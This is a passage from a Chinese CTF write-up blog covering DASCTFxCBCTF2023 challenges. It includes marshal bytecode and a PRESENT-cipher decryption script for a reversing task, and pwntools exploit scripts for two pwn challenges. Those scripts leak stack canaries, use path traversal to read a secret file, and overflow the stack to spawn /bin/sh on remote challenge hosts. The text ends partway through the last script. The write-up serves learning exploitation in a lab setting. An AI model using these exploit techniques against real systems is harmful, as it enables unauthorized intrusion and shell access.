\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"><span class="comment"># 反编译字节码并写入文件</span></span><br><span class="line">source_code = uncompyle6.deparse_code(<span class="number">3.8</span>, marshal.loads(code))</span><br><span class="line"><span class="built_in">print</span>(source_code)</span><br><span class="line"><span class="comment"># l = marshal.loads(code)</span></span><br><span class="line"><span class="comment"># exec(l)</span></span><br><span class="line"><span class="comment"># dis.dis(l)</span></span><br><span class="line"><span class="comment"># # deserialized_data = pickle.loads(code)</span></span><br><span class="line"><span class="comment"># # exec (deserialized_data)</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>marshal模块</strong>官方的介绍是marshal模块包括了以二进制的格式读写python值的函数，<code>.pyc</code>文件的“伪编译”代码。与python的序列化和反序列化相关（不推荐），这里还提及到的是pickle模块。</p>
+<p>题目中的是marshal.load()函数，它将二进制数据反序列化为python对象，<code>marshal.dump(value,file[,version])</code>序列化的函数，value表示待序列化的值，file表示打开的输出流</p>
+</blockquote>
+<p>回归正题，官方提供的WP详细地介绍了关于这道题的解法：</p>
+<p>使用marshal 库加载字节码运行，反编译使用<code>dis.dis</code>，<code>exec()</code>函数动态执行代码。</p>
+<blockquote>
+<p><code>exec()</code>函数是动态执行字符串类型的代码，基本的语法<code>exec(object[, globals[, locals]])</code> 其中global和local都是可选参数，表示全局和局部变量，如果没有就是当前作用域的命名空间。</p>
+</blockquote>
+<p>从脚本看，<code>exec()</code>函数可使用<code>globals()</code>查看，程序输入错误会退出，可以在exec前定义exit()函数，并使用try执行exec防止退出</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">exec</span> (l)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example1.png"
+                      alt="Untitled 1"
+                ></p>
+<p>输出的东西看不懂，直接百度其中一些特殊的函数名，是PRESENT算法，涉及另一个知识盲区。</p>
+<blockquote>
+<p>python的序列化和反序列化：序列化是把变量从内存中变成可存储或传输形式的过程，反序列化是将变量内容从序列化的对象重新读到内存的过程。就像使用TCP&#x2F;IP协议进行通信传输，只支持字节数组的传输，那在发送端要在传输之前要先进行序列化，将预传输的对象传化为字节的形式，接收端则需要将字节反序列化，转为原对象。</p>
+<p>原因：程序运行变量是在内存中操作的，但内存无法永久的保存数据，执行完毕占有的内存空间就会回收，在退出程序之前需要将操作的数据保存在磁盘中，以便下次数据的读取。python中叫做pickling和unpickling</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>,<span class="number">1</span>): </span><br><span class="line">            roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">            key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">            key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">            key ^= (i &lt;&lt; <span class="number">15</span>)^(key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = block</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">                state = addRoundKey(state, roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                state = pLayer_dec(state)</span><br><span class="line">                state = sBoxLayer_dec(state)</span><br><span class="line">        decipher = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decipher&gt;&gt;(c*<span class="number">8</span>) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line">decrypt(cmps)</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a><strong><strong>GuestBook</strong></strong></h2><p>使用checksec看到了canary保护，查看一些技术文章，总觉得差一步。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>进入函数查看，最多只能输入四次，通过strcpy函数，从堆复制到栈上，输入的长度不限，存在栈溢出。由于使用strcpy函数，所以输入的数据中含有\x00字符就会被截断，要从栈后面往前覆盖，多次输入。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example2.png"
+                     
+                ></p>
+<p>找到<code>system(&quot;/bin/sh&quot;)</code>返回地址，发现是先进行覆盖，同时payload要利用泄露的Canary不破坏栈上的Canary在利用第二次输入，将Canary的\x00字节通过strcpy复制时自动末尾补恢复Canary，触发ret2text来getshell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example3.png"
+                      alt="Untitled 3"
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#日志级别设置为&#x27;debug&#x27;,架构设置&#x27;amd64&#x27;                                             </span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#确定代码为远程服务器运行</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28731</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#本地运行时与GDB一起，附加到目标进程，选择执行GDB中的命令</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        <span class="keyword">if</span> a==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#从目标接收数据，找到字符串x</span></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line"><span class="comment">#发送一行字符串</span></span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">sd=<span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line"><span class="comment">#接收数据a后发送数据b</span></span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:p.sendafter(a,b)</span><br><span class="line"><span class="comment">#接收数据a后发送一行b</span></span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class="line"><span class="comment">#与目标进程的交互式会话</span></span><br><span class="line">ia=<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"><span class="comment">#定义leak_address()函数，从进程中泄露canary值，</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>():</span><br><span class="line">    <span class="keyword">if</span>(context.arch==<span class="string">&#x27;i386&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Please input you name: &quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">24</span>+<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">canary = leak_canary()</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;How many message would you like to leave(MAX 4):&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="comment">#(0xA0-8)达到堆栈上的返回地址+&quot;C&quot;字符+泄露的Canary值以7字节接收，省略末尾空字+&#x27;B&#x27;填充+地址</span></span><br><span class="line">payload = (<span class="number">0xA0</span>-<span class="number">8</span>)*<span class="string">&quot;A&quot;</span>+<span class="string">&quot;C&quot;</span>+p64(canary)[<span class="number">1</span>:]+<span class="number">8</span>*<span class="string">&quot;B&quot;</span>+<span class="string">&quot;\xC3\x12\x40&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造另一个payload，长度</span></span><br><span class="line">payload = (<span class="number">0xA0</span>-<span class="number">8</span>-<span class="number">32</span>*<span class="string">&quot;A&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a><strong>Canary绕过</strong></h3><p>首先介绍Canary：栈溢出是通过溢出存在在栈上的局部变量，让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。栈溢出保护，缓冲区溢出攻击缓解手段，覆盖栈上的返回地址执行shellcode。</p>
+<p>启用站保护，函数执行时会在栈的尾部插入cookie值，函数返回时检测cookie值是否合法（在栈桢销毁前测试值是否被改变：攻击在覆盖返回地址是会将cookie值给覆盖掉），不合法就直接停止程序运行，组织了shellcode的执行，避免漏洞执行。在 Linux 中将 cookie 信息称为 Canary。就本题中的汇编来看，类似这样的标识符。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012D2                               ; __unwind &#123;</span><br><span class="line">.text:00000000004012D2 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:00000000004012D6 55                            push    rbp</span><br><span class="line">.text:00000000004012D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004012DA 48 81 EC A0 00 00 00          sub     rsp, 0A0h</span><br><span class="line">.text:00000000004012E1 64 48 8B 04 25 28 00 00 00    mov     rax, fs:28h</span><br><span class="line">;在启用canary编译后，函数会取fs寄存器0x28处的值，</span><br><span class="line">.text:00000000004012EA 48 89 45 F8                   mov     [rbp+var_8], rax</span><br><span class="line">;存放在栈中[rbp+var_8]的位置，操作即为栈中插入canary</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.text:0000000000401470 48 8B 45 F8                   mov     rax, [rbp+var_8] </span><br><span class="line">;函数返回之前，将变量交给rax</span><br><span class="line">.text:0000000000401474 64 48 33 04 25 28 00 00 00    xor     rax, fs:28h </span><br><span class="line">;比较fs寄存器0x28处的值和原本的存储异或判断canary是否被修改 相等即rax=0</span><br><span class="line">.text:000000000040147D 74 05                         jz      short locret_401484  </span><br><span class="line">;结果是0不跳转 </span><br><span class="line">.text:000000000040147D</span><br><span class="line">.text:000000000040147F E8 6C FC FF FF                call    ___stack_chk_fail    </span><br><span class="line">;不是0则执行call调用程序崩溃函数</span><br></pre></td></tr></table></figure></div>
+
+<p>canary设计以字节<code>\x00</code>结尾，为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。</p>
+<p>后续再做一些这样的题目来熟悉。</p>
+<h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a><strong><strong>EASYBOX</strong></strong></h2><p>这三道题，查看了出题人的博客，利用的是CVE（CVE-2023-40930）tql</p>
+<p>学习到两种解法：</p>
+<p>下载之后是一个docker文件压缩包，在bin下找到pwn文件，即分析的赛题，使用checksec发现开了canary，在init函数中查看到了canary.txt，main函数中存在“PING”,“CAT”,”LS”,“HELP”和“EXIT”功能，发现主要利用的是pingCommand()函数和catCommand()函数。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example4.png"
+                      alt="Untitled 4"
+                ></p>
+<p><code>pingCommand()</code> 函数先向s输入0xff个字节，通过<code>sprintf(command, &quot;ping -c 4 %s &gt; /tmp/result.txt&quot;, s);</code>将数据存在到command，从上面看<code>char command[520];</code> command大小为0x208，通过sprintf将s中的数据发给command遇到’\x00’字符就会结束(canary)，接着再执行system，还有check_ip的限制。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/PING.png"
+                      alt="PING"
+                ></p>
+<h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="(1) 命令注入"></a>(1) 命令注入</h3><h3 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="(2) 栈溢出"></a>(2) 栈溢出</h3><p>分析pwn文件其中的catCommand函数通过fread从一个文件中读取数据存在栈上的数组，存在栈溢出</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=<span class="keyword">lambda</span>: r.interactive()</span><br><span class="line">sl=<span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b: r.sendlineafter(a,b)</span><br><span class="line">se=<span class="keyword">lambda</span> a: r.send(a)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b: r.sendafter(a,b)</span><br><span class="line">lg=<span class="keyword">lambda</span> name,data: log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(data))</span><br><span class="line">rcu=<span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>():</span><br><span class="line">gdb.attach(r)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">global</span> r</span><br><span class="line"><span class="keyword">global</span> libc</span><br><span class="line"><span class="keyword">global</span> ef</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27362</span>)</span><br><span class="line"><span class="comment">#ef = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#ef.checksec()</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401ce3</span></span><br><span class="line">system = <span class="number">0x401230</span></span><br><span class="line">sh = <span class="number">0x402090</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">## leak canary</span></span><br><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;view:&quot;</span>,<span class="string">&quot;../secret/canary.txt&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"><span class="comment">## stack overflow 